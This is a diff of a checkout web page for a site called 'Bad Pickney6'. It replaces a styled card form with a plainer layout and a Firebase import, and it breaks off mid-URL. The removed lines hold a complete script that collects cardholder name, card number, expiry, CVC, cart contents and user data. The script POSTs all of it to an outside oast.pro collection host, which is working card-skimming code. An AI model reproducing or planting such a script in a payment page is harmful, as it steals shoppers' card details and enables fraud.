@@ -5,148 +5,44 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Checkout - Bad Pickney6</title>
   <link rel="stylesheet" href="styles.css">
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f9f9f9;
-      padding: 40px 20px;
-    }
-
-    .checkout-container {
-      max-width: 800px;
-      margin: 0 auto;
-      background: #fff;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 6px 20px rgba(0,0,0,0.1);
-    }
-
-    h2 {
-      text-align: center;
-      margin-bottom: 30px;
-      color: #0077cc;
-    }
-
-    .cart-item {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 15px;
-      padding-bottom: 10px;
-      border-bottom: 1px solid #ccc;
-    }
-
-    .cart-item span {
-      font-weight: bold;
-    }
-
-    #totalPrice {
-      text-align: right;
-      font-size: 1.2rem;
-      font-weight: bold;
-      margin-top: 20px;
-      margin-bottom: 30px;
-    }
-
-    #checkoutForm input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 15px;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-    }
-
-    #checkoutForm button {
-      width: 100%;
-      padding: 12px;
-      background: #28a745;
-      color: white;
-      font-weight: bold;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 1rem;
-    }
-
-    #checkoutForm button:hover {
-      background: #218838;
-    }
-  </style>
 </head>
 <body>
-  <div class="checkout-container">
-    <h2>Checkout</h2>
-    <div id="cartItemsContainer"></div>
-    <div id="totalPrice"></div>
+  <!-- HEADER -->
+  <header>
+    <div class="container">
+      <h1>Checkout</h1>
+      <nav>
+        <ul>
+          <li><a href="shop.html">Shop</a></li>
+          <li><a href="#" id="logoutBtn">Logout</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
 
-    <form id="checkoutForm">
-      <h3>Enter Card Info</h3>
-      <input type="text" name="cardName" placeholder="Cardholder Name" required>
-      <input type="text" name="cardNumber" placeholder="Card Number" required>
-      <input type="text" name="expiry" placeholder="Expiry MM/YY" required>
-      <input type="text" name="cvc" placeholder="CVC" required>
-      <button type="submit">Submit Purchase</button>
-    </form>
-  </div>
+  <!-- CHECKOUT FORM -->
+  <section id="checkout" class="section">
+    <div class="container">
+      <h2>Your Cart</h2>
+      <ul id="cartItems"></ul>
+      <p id="totalPrice"></p>
 
-  <script>
-    // Only logged-in users
-    const loggedInUser = JSON.parse(localStorage.getItem('loggedInUser'));
-    if (!loggedInUser) {
-      alert("You must be logged in to access checkout!");
-      window.location.href = "index.html";
-    }
+      <h2>Payment Info</h2>
+      <form id="checkoutForm">
+        <input type="text" name="name" placeholder="Cardholder Name" required>
+        <input type="text" name="cardNumber" placeholder="Card Number" required>
+        <input type="text" name="expiry" placeholder="MM/YY" required>
+        <input type="text" name="cvc" placeholder="CVC" required>
+        <button type="submit">Submit Payment</button>
+      </form>
 
-    // Get cart
-    const cart = JSON.parse(localStorage.getItem('cart') || '[]');
-    if (!cart.length) {
-      alert("Your cart is empty!");
-      window.location.href = "shop.html";
-    }
+      <p id="confirmation" style="color:green; font-weight:bold; margin-top:15px;"></p>
+    </div>
+  </section>
 
-    const cartContainer = document.getElementById('cartItemsContainer');
-    const totalPriceEl = document.getElementById('totalPrice');
+  <footer>
+    <p>&copy; 2025 Bad Pickney6</p>
+  </footer>
 
-    let total = 0;
-    cartContainer.innerHTML = cart.map(item => {
-      total += item.price;
-      return `<div class="cart-item">
-        <div>${item.name}</div>
-        <div>$${item.price}</div>
-      </div>`;
-    }).join('');
-
-    totalPriceEl.textContent = `Total: $${total}`;
-
-    // Handle form submit
-    const form = document.getElementById('checkoutForm');
-    form.addEventListener('submit', (e) => {
-      e.preventDefault();
-      const formData = {
-        cardName: form.cardName.value,
-        cardNumber: form.cardNumber.value,
-        expiry: form.expiry.value,
-        cvc: form.cvc.value,
-        items: cart,
-        total: total,
-        user: loggedInUser
-      };
-
-      // Send to Request Bin
-      fetch("https://6dc777f83b840b1f739bg1ftg9ayyyyyb.oast.pro", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(formData)
-      })
-      .then(() => {
-        alert("Purchase submitted!");
-        localStorage.removeItem('cart'); // clear cart
-        window.location.href = "index.html";
-      })
-      .catch(err => {
-        console.error(err);
-        alert("Failed to submit purchase.");
-      });
-    });
-  </script>
-</body>
-</html>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.
